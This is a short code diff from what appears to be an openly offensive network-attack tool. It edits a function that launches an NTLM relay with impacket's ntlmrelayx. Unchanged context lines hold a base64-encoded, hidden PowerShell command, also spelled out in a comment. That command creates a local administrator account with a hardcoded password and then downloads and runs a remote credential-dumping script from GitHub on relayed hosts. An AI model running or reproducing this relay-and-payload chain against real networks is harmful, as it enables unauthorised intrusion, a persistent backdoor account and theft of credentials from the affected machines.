@@ -810,8 +810,13 @@ def run_relay_attack(iface, args):
         # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
 
-    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3 -c "{}"'.format(remote_cmd))
+    if os.path.isfile('smb-signing-disabled-hosts.txt'):
+        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3 -c "{}"'.format(remote_cmd))
+    else:
+        print_bad('No hosts with SMB signing disabled; SMB relay for command execution will not work although you may still capture hashes')
+        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes -wa 3 -c "{}"'.format(remote_cmd))
     ntlmrelay_proc = run_proc(relay_cmd)
 
     return resp_proc, ntlmrelay_proc
